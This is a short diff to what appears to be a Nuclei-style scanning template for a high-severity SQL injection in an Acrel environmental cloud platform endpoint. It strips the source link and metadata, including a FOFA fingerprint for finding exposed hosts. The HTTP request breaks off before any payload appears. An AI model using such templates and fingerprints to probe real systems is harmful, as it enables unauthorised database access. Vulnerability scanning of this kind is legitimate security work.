@@ -3,12 +3,8 @@ info:
   name: 安科瑞-智能环保云平台 getenterpriseinfoy 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bgrxtbgq6h014s0f'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bgrxtbgq6h014s0f
-    fofa: icon_hash="-1201212481" || body="myCss/phone.css"
 http:
 - raw:
   - 'POST /MainMonitor/GetEnterpriseInfoY HTTP/2
